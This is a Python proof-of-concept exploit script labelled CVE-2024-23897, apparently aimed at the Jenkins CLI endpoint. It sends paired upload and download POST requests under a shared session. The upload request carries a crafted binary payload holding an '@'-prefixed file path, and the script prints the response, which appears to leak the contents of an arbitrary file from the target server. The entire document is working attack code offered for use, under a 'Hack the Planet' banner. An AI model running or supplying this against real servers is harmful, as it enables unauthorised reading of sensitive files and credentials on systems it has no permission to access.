import http.client
import argparse
from urllib.parse import urlparse
import threading
import uuid
import re
import sys

def ascii():
    art = print("""   _  _         _     _   _          ___ _       
 | || |__ _ __| |__ | |_| |_  ___  | _ \ |__ _ _ _  ___| |_ 
 | __ / _` / _| / / |  _| ' \/ -_) |  _/ / _` | ' \/ -_)  _|
 |_||_\__,_\__|_\_\  \__|_||_\___| |_| |_\__,_|_||_\___|\__|
""")
    return art
    
def first(uuidStr, payload, target):
    try:
        conn = http.client.HTTPConnection(target)
        conn.request("POST", "/cli?remoting=false", headers={
            "Session": uuidStr,
            "Side": "upload",
            "Content-Type": "application/octet-stream"
        }, body=payload)

    except Exception as e:
       print(e)

def second(uuidStr, target):
    try:
        conn = http.client.HTTPConnection(target)
        conn.request("POST", "/cli?remoting=false", headers ={
            "Session": uuidStr,
            "Side": "download"
        })
        
        final = conn.getresponse().read()
        
        print(final)

    except Exception as e:
       print(e)

def exploit(tarFile, target):
    uuidStr = str(uuid.uuid4())
    
    print("Exploiting..")
    payload = b'\x00\x00\x00\x0E\x00\x00\x0Cconnect-node\x00\x00\x00\x0E\x00\x00\x0C@' + tarFile.encode() + b'\x00\x00\x00\x07\x02\x00\x05UTF-8\x00\x00\x00\x07\x01\x00\x05en_US\x00\x00\x00\x00\x03'
       
    # Creating two threads
    t1 = threading.Thread(target=first, args=(uuidStr, payload, target))
    t2 = threading.Thread(target=second, args =(uuidStr, target))
    # Starting the threads
    t1.start()
    t2.start()
    # Wait for both threads to finish
    t1.join()
    t2.join()
    
def main():
    parser = argparse.ArgumentParser(description="CVE-2024-23897")
    parser.add_argument("-u", '--targetUrl', required=True, help="The target URL")
    parser.add_argument("-f", '--targetFile', required=True, help="The target file")
    args = parser.parse_args()
    try:
        if args.targetUrl and args.targetFile:
            pattern = r"http[s]?://([^:/]+:\d+)/"
            match = re.search(pattern, args.targetUrl)
            target = match.group(1)
            ascii()
            exploit(args.targetFile, target)
            
    except Exception as e:
        sys.exit("Some error occured..")
        
if __name__ == "__main__":
    main()
